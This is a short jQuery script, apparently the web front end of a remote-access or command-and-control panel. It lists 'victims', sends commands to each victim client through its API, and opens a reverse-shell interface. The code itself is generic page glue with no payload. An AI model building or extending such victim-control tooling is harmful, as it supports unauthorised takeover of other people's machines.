/* ---------------------------------------------------
    CUSTOM SCROLLBAR
----------------------------------------------------- */
$(document).ready(function () {

    $("#sidebar").mCustomScrollbar({
        theme: "minimal"
    })

    $('#sidebarCollapse').on('click', function () {
        $('#sidebar, #content').toggleClass('active')
        $('.collapse.in').toggleClass('in')
        $('a[aria-expanded=true]').attr('aria-expanded', 'false')
    })

})

/* ---------------------------------------------------
    VICTIMS PAGE : Open link to access specific victim
----------------------------------------------------- */
$(document).ready(function ($) {
    $('*[data-href]').not($('.btn-command')).on('click', function () {
        window.location = $(this).data("href")
    })
})


/* ---------------------------------------------------
    SPECIFIC VICTIM PAGE : Buttons to submit commands via AJAX
----------------------------------------------------- */
$(document).ready(function ($) {

    $('.btn-command').on('click', function () {

        // If it's a shell's request, then we open the shell interface in a new tab
        if ($(this).data("command") === "reverse-shell") {
            const url = new URL(window.location.origin + '/app/command/shell/' + $(this).data("uuid"))
            window.open(url, '_blank')
            $('#commandSent').fadeIn(1000)
            $('#commandSent').delay(3000).fadeOut(1000)
        }
        // Else, we just send the command
        else {
            const command = JSON.stringify({ "name": $(this).data("command").toUpperCase() })
            const url = new URL(window.location.origin + '/api/clients/' + $(this).data("uuid") + '/commands')
    
            $.ajax({
                type: "POST",
                data: command,
                url: url,
                contentType: "application/json"
            })
                .done((data) => {
                    console.log("The AJAX request to send command is a success !")
                    $('#commandSent').fadeIn(1000)
                    $('#commandSent').delay(3000).fadeOut(1000)
                })
                .fail(() => {
                    console.log("The AJAX request to send command failed ...")
                    alert("An error occurred ...")
                })
        }
    })
})
